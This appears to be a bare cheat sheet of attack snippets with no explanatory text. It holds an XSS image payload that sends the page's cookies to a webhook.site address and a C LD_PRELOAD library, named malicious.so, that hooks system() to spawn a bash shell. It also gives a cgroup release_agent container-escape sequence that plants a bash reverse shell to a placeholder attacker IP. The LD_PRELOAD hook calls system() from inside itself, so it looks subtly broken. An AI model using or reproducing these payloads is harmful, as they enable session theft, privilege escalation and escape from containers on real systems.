<img src="x" onerror="if (!window.spammed) { window.spammed = true; this.src='https://webhook.site/b289fee0-0412-4cbb-9a24-5658f3066af3/?' + document.cookie; }">

#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>

int system(const char *command) {
    if (!command) return 0;
    
    // You can add your custom code here to run a root shell
    system("/bin/bash");

    // Call the original system() function
    typedef int (*orig_system)(const char *);
    orig_system original_system = dlsym(RTLD_NEXT, "system");
    return original_system(command);
}

gcc -shared -fPIC -o malicious.so malicious.c -ldl

export LD_PRELOAD=~/path_to_malicious.so


mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x

echo 1 > /tmp/cgrp/x/notify_on_release
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "$host_path/cmd" > /tmp/cgrp/release_agent

echo '#!/bin/sh' > /cmd
echo 'bash -c "bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1"' >> /cmd
chmod +x /cmd

sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
